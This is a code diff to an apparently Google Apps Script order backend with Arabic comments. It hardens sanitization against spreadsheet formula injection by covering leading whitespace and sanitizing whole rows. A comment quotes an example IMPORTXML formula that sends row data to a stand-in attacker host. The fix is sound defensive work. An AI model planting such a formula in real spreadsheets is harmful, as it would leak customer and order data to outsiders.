@@ -92,8 +92,26 @@ function fmtDate_(v) {
 
 function sanitizeCell_(s) {
   s = String(s == null ? '' : s);
-  if (/^[=+\-@]/.test(s)) return "'" + s;
+  // بنضيف \t و\r كمان: جوجل شيت بيتجاهل المسافات في أول الخانة، فـ "\t=CMD" لسه
+  // بيتقري كصيغة. الشرط القديم كان بيفوّتها.
+  if (/^[\s]*[=+\-@\t\r]/.test(s)) return "'" + s;
   return s;
+}
+
+// ⚠️ ثغرة كانت هنا: تنظيف الصيغ (sanitizeCell_) كان متطبّق على 4 حقول بس
+// (الاسم، صاحب الأوردر، ملاحظات العميل، ملاحظة الصنف). باقي الحقول اللي الموزع
+// بيكتبها بإيده — «المنطقة»، ونص الرسالة، وتليفون صاحب الأوردر، واسم الصنف والكود
+// والمقاس — كانت بتتكتب في الشيت زي ما هي.
+// و endpoint الـ newOrder مفتوح من غير كلمة سر (لازم يفضل كده عشان الموزعين
+// يقدروا يبعتوا)، يعني أي حد يقدر يبعت طلب فيه صيغة زي:
+//     =IMPORTXML("https://evil.example/?d="&A1&B1, "//x")
+// وأول ما موظف المصنع يفتح الشيت، جوجل بينفّذ الصيغة ويسرّب بيانات الصفوف لسيرفر بره.
+// الحل: ننظّف الصف كله — كل خانة نصية بتعدّي على sanitizeCell_، والأرقام والتواريخ
+// بتفضل زي ما هي عشان الجمع والترتيب في الشيت ما يتكسرش.
+function sanitizeRow_(row) {
+  return row.map(function (v) {
+    return (typeof v === 'string') ? sanitizeCell_(v) : v;
+  });
 }
 
 // بيرجّع رقم الطلب "العادي" التسلسلي الجاي (1، 2، 3...) — بيتخزن في Script Properties وبيتزوّد بأمان.
@@ -764,6 +782,8 @@ function saveOrder_(o) {
     o.customerPhone || ''  // تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
   ];
 
+  rowO = sanitizeRow_(rowO);   // كل خانة نصية تتنظّف من الصيغ قبل ما تدخل الشيت
+
   if (existing > 0) {
     // بنحافظ على الحالة والملاحظة اللي المصنع كتبها، ونحدّث الباقي بس
     var keep = shO.getRange(existing, COL_STATUS, 1, 2).getValues()[0];
@@ -843,7 +863,8 @@ function saveOrder_(o) {
   }
 
   if (lines.length) {
-    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length).setValues(lines);
+    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length)
+       .setValues(lines.map(sanitizeRow_));   // نفس التنظيف على كل سطر صنف
   }
 
   // ---- خصم الرصيد ----
